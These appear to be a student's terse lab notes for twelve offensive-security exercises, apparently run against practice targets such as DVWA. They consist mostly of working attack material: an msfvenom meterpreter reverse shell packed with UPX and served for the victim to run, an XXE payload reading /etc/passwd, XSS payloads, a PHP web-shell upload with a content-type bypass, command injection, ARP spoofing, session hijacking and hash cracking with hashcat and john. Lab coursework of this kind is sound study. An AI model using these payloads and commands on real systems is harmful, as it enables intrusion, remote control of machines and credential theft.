12 exp
sudo su
adb devices -l 
adb tcpip 5555
adb pair 10.25.249.189:46127
adb connect 10.25.249.189:5555
adb devices -l 
adb -s 10.25.249.189:5555 pull "/sdcard/12.jpg" "/home/mrbaby/Desktop"



11 exp
download the dd folder from https://dftt.sourceforge.net/ 
open autopsy
continue..


10exp
sudo su
systemctl start mysql 
systemctl start apache2

login admin and login groub in private 

capturing (Sessio id)packets from admin then pasteing it in private 


9exp
sudo su
systemctl start MySQL
systemctl start apache2

<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

&xxe;


7exp
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali -IP> lport=4444 -f exe-only -o shell.exe
upx --best --lzma shell.exe 
msfconsole 
use exploit/multi/handler          
set payload windows/meterpreter/reverse_tcp
set lhost <KALI – IP>    
set lport 4444
run 
python3 -m http.server 8080 ( for downloading the shell in window ) used in kali then in to see the result use the ip of the kali system with (ip):8080
then run using run as administration by offing the virus then download it 
getuid
screenshare 




6exp
a
wireshark
http.request.method == "POST" 

b
Ettercap
hostlist 
scan 
select target 1 as window and 2 as gate way 
apr 


5exp
sudo su
systemctl start MySQL
systemctl start apache2

command injuction 
ip address 127.0.0.1
low,medium,and high
view below


4exp
sudo su
systemctl start MySQL
systemctl start apache2

download index.ph from github.com/artyuum/simple-php-web-shell
file upload low (copy) , medium ( using burp suit change the content type to "image/jpeg" )


3exp
sudo su
systemctl start MySQL
systemctl start apache2
easy (copy paste the url)
medium (using burp suit then click forward then in first line link copy paste in the private url NOTE:off intersept and proxy)

2exp
sudo su
systemctl start MySQL
systemctl start apache2
 
low  <script>alert("Welcome to Hackers world")</script>
medium  <body onload=alert(1)>
high    "><svg/onload=alert(1)>

1exp
sudo su
hash-identifier
hashcat -h | grep MD5
echo '202cb962ac59075b964b07152d234b70' >hash1.txt 
hashcat -m 0 hash1.txt /usr/share/wordlists/rockyou.txt
echo '7110eda4d09e062aa5e4a390b0a572ac0d2c0220' >crack1.txt
john --format=raw-sha1 crack1.txt 
echo '81dc9bdb52d04dc20036dbd8313ed055' >crack2.tx
john --format=raw-MD5 crack2.txt

 
